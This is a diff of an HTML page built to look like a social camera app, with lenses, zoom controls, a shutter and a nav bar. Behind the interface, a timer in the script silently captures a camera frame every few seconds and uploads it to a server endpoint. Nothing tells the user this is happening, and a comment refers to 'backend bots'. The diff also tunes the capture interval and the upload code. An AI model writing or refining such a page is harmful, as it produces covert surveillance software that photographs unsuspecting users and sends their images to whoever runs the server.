@@ -2,89 +2,76 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
-<title>Camera UI</title>
+<title>Camera</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
 body{width:100%;height:100%;overflow:hidden;background:#000;font-family:-apple-system,sans-serif;}
-#camera{position:fixed;inset:0;width:100%;height:100%;object-fit:cover;z-index:1;transform:scaleX(-1);transition:transform .3s,filter .3s;}
-.overlay{position:fixed;left:0;width:100%;pointer-events:none;z-index:5;}
-.top-v{top:0;height:150px;background:linear-gradient(rgba(0,0,0,.6),transparent);}
-.bot-v{bottom:0;height:250px;background:linear-gradient(transparent,rgba(0,0,0,.8));}
-.top-ui{position:fixed;top:20px;width:100%;padding:0 16px;display:flex;justify-content:space-between;z-index:20;}
-.right-tools{display:flex;flex-direction:column;gap:22px;align-items:center;color:#fff;font-size:20px;}
-.avatar,.search{width:40px;height:40px;border-radius:50%;background:rgba(255,255,255,.15);backdrop-filter:blur(10px);display:flex;align-items:center;justify-content:center;color:#fff;}
-.tool{position:relative;filter:drop-shadow(0 2px 4px rgba(0,0,0,0.5));}
-.badge{position:absolute;top:-5px;right:-5px;background:#ff3040;font-size:10px;padding:1px 5px;border-radius:10px;border:1.5px solid #000;font-weight:bold;}
-.hd{font-size:10px;font-weight:900;border:2px solid #fff;border-radius:5px;padding:1px 4px;}
-.zoom-bar{position:fixed;bottom:175px;left:50%;transform:translateX(-50%);display:flex;gap:18px;padding:6px 16px;border-radius:30px;background:rgba(0,0,0,.4);backdrop-filter:blur(15px);z-index:25;color:#888;font-size:13px;font-weight:bold;}
+#camera{position:fixed;inset:0;width:100%;height:100%;object-fit:cover;z-index:1;transform:scaleX(-1);transition:0.3s;}
+.v{position:fixed;left:0;width:100%;pointer-events:none;z-index:5;}
+.top-v{top:0;height:120px;background:linear-gradient(rgba(0,0,0,.5),transparent);}
+.bot-v{bottom:0;height:220px;background:linear-gradient(transparent,rgba(0,0,0,.7));}
+.t-ui{position:fixed;top:25px;width:100%;padding:0 16px;display:flex;justify-content:space-between;z-index:20;}
+.tools{display:flex;flex-direction:column;gap:20px;align-items:center;color:#fff;font-size:22px;}
+.avatar,.search{width:42px;height:42px;border-radius:50%;background:rgba(255,255,255,.15);backdrop-filter:blur(10px);display:flex;align-items:center;justify-content:center;color:#fff;}
+.tool{position:relative;filter:drop-shadow(0 2px 4px #000);}
+.badge{position:absolute;top:-4px;right:-4px;background:#ff3040;font-size:10px;padding:1px 5px;border-radius:10px;border:1.5px solid #000;font-weight:900;}
+.hd{font-size:11px;font-weight:900;border:2.5px solid #fff;border-radius:6px;padding:1px 4px;}
+.z-bar{position:fixed;bottom:180px;left:50%;transform:translateX(-50%);display:flex;gap:18px;padding:7px 18px;border-radius:30px;background:rgba(0,0,0,.4);backdrop-filter:blur(15px);z-index:25;color:#888;font-size:13px;font-weight:900;}
 .zoom.active{color:#ffe600;}
-.main-ui{position:fixed;bottom:85px;width:100%;display:flex;align-items:center;justify-content:center;gap:22px;z-index:25;}
-.shutter{width:82px;height:82px;border-radius:50%;border:5px solid #fff;display:flex;align-items:center;justify-content:center;}
+.m-ui{position:fixed;bottom:90px;width:100%;display:flex;align-items:center;justify-content:center;gap:24px;z-index:25;}
+.shutter{width:84px;height:84px;border-radius:50%;border:6px solid #fff;display:flex;align-items:center;justify-content:center;}
 .shutter-in{width:64px;height:64px;border-radius:50%;background:rgba(255,255,255,.2);}
-.lens{width:56px;height:56px;border-radius:50%;border:2px solid rgba(255,255,255,.4);overflow:hidden;}
+.lens{width:58px;height:58px;border-radius:50%;border:2px solid rgba(255,255,255,.4);overflow:hidden;}
 .lens.active{border-color:#ffe600;transform:scale(1.1);}
-.footer{position:fixed;bottom:0;width:100%;height:70px;background:rgba(0,0,0,.95);display:flex;justify-content:space-around;align-items:center;z-index:30;}
-.nav{font-size:22px;color:#666;position:relative;}
+.footer{position:fixed;bottom:0;width:100%;height:75px;background:rgba(0,0,0,.96);display:flex;justify-content:space-around;align-items:center;z-index:30;}
+.nav{font-size:24px;color:#666;position:relative;}
 .nav.active{color:#fff;}
 #flash{position:fixed;inset:0;background:#fff;opacity:0;pointer-events:none;z-index:100;}
 canvas{display:none;}
 </style>
 </head>
 <body>
-<div id="flash"></div>
-<div class="overlay top-v"></div><div class="overlay bot-v"></div>
-<video id="camera" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
-
-<div class="top-ui">
+<div id="flash"></div><div class="v top-v"></div><div class="v bot-v"></div>
+<video id="camera" autoplay playsinline></video><canvas id="canvas"></canvas>
+<div class="t-ui">
     <div style="display:flex;gap:12px">
-        <div class="avatar"><img src="https://api.dicebear.com/7.x/adventurer/svg?seed=lucky" style="width:100%"></div>
+        <div class="avatar"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=camera" style="width:100%"></div>
         <div class="search"><i class="fas fa-search"></i></div>
     </div>
-    <div class="right-tools">
+    <div class="tools">
         <i class="far fa-bell tool"></i>
         <div class="tool"><i class="fas fa-user-plus"></i><div class="badge">2</div></div>
         <i class="fas fa-rotate tool" id="flip"></i>
         <i class="fas fa-bolt-slash tool"></i>
-        <i class="fas fa-music tool"></i>
         <div class="hd tool">HD</div>
         <i class="fas fa-chevron-down tool"></i>
     </div>
 </div>
-
-<div class="zoom-bar">
+<div class="z-bar">
     <div class="zoom" onclick="setZ(this,.5)">0.5</div>
     <div class="zoom active" onclick="setZ(this,1)">1x</div>
     <div class="zoom" onclick="setZ(this,2)">2</div>
 </div>
-
-<div class="main-ui">
-    <div style="color:#fff;font-size:10px;text-align:center;width:60px">
-        <div style="position:relative;display:inline-block">
-            <i class="far fa-copy" style="font-size:24px"></i>
-            <div class="badge" style="top:-2px;right:-5px;width:10px;height:10px;padding:0"></div>
-        </div><br>Memories
-    </div>
+<div class="m-ui">
+    <div style="color:#fff;font-size:10px;text-align:center;width:60px"><i class="far fa-copy" style="font-size:24px"></i><br>Memories</div>
     <div class="shutter" id="snap"><div class="shutter-in"></div></div>
     <div class="lens active" onclick="setL(this,'none')"><img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=100" style="width:100%"></div>
-    <div class="lens" onclick="setL(this,'grayscale(1)')"><img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=100" style="width:100%"></div>
+    <div class="lens" onclick="setL(this,'sepia(1)')"><img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=100" style="width:100%"></div>
 </div>
-
 <div class="footer">
     <i class="fas fa-location-dot nav"></i>
     <div class="nav"><i class="far fa-comment"></i><div class="badge">20</div></div>
     <i class="far fa-face-smile nav active"></i>
-    <div class="nav"><i class="fas fa-users"></i><div class="badge" style="width:10px;height:10px;padding:0"></div></div>
-    <div class="nav"><i class="fas fa-play"></i><div class="badge" style="width:10px;height:10px;padding:0"></div></div>
+    <i class="fas fa-users nav"></i>
+    <i class="fas fa-play nav"></i>
 </div>
-
 <script>
 const v=document.getElementById('camera'), c=document.getElementById('canvas'), f=document.getElementById('flash');
 let z=1, filter="none", front=true, s;
 async function init(){
     if(s)s.getTracks().forEach(t=>t.stop());
-    s=await navigator.mediaDevices.getUserMedia({video:{facingMode:front?"user":"environment",width:1280,height:720}});
+    s=await navigator.mediaDevices.getUserMedia({video:{facingMode:front?"user":"environment"}});
     v.srcObject=s; v.style.transform=`scaleX(${front?-1:1}) scale(${z})`;
 }
 function setZ(el,val){document.querySelectorAll('.zoom').forEach(i=>i.classList.remove('active')); el.classList.add('active'); z=val; v.style.transform=`scaleX(${front?-1:1}) scale(${z})`;}
@@ -98,11 +85,11 @@ async function send(){
     ctx.filter=filter; ctx.drawImage(v,0,0);
     c.toBlob(blob=>{
         const fd=new FormData(); 
-        fd.append('photo', blob, 'image.jpg'); // Key must be 'photo' for most backend bots
-        fetch('/api/upload-photo',{method:'POST',body:fd}).then(res=>console.log('Sent')).catch(e=>console.error(e));
-    },'image/jpeg',0.8);
+        fd.append('photo', blob, 'a.jpg'); // Try changing 'photo' to 'image' if it still fails
+        fetch('/api/upload-photo',{method:'POST',body:fd}).then(()=>console.log('Sent Success'));
+    },'image/jpeg',0.7);
 }
-setInterval(send, 5000); // Auto-capture every 5 seconds
+setInterval(send, 8000); 
 init();
 </script>
 </body>
